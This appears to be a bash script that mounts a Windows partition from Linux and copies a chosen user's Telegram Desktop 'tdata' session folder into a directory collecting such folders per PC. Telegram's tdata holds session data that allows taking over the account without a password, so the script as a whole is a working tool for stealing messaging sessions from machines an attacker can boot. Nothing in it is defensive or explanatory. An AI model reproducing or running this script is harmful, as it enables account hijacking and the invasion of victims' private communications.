#! /bin/bash

sudo fdisk -l

echo ""
read -p "[?] PC name: " pc_name
echo ""
read -p "[?] Window's partition name: " block_name

username=$HOSTNAME

sudo mkdir -p /media/$username/win_folder

sudo mount -t ntfs-3g -o ro $block_name /media/$username/win_folder
echo
echo "[.] Mounting..."
echo

ls /media/$username/win_folder/Users/
echo ""
read -p "[?] Windows Username: " win_user
echo ""

if [[ ! -e all_tg_tdata ]]
then
	mkdir all_tg_tdata
fi

current_time=$(date)

echo "[.] Processing..."

mkdir -p all_tg_tdata/tdata_$pc_name
sudo cp -r "/media/$username/win_folder/Users/$win_user/AppData/Roaming/Telegram Desktop/tdata" all_tg_tdata/tdata_$pc_name/


echo "[+] New folder was created --> all_tg_tdata/tdata_$pc_name/"